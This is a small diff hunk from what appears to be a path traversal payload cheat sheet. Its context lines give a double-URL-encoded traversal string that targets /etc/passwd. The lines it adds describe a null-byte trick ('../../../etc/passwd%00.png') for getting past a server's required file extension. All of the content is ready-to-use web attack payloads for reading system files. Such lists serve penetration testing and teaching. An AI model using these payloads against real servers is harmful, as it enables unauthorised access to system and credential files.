@@ -19,6 +19,8 @@ When filename should start with some string
 When server URL-decode of the input before using it.
 >..%252f..%252f..%252fetc/passwd
 
+When server require ending, like `png` , use null bytes, for example
+>../../../etc/passwd%00.png
 
 
 
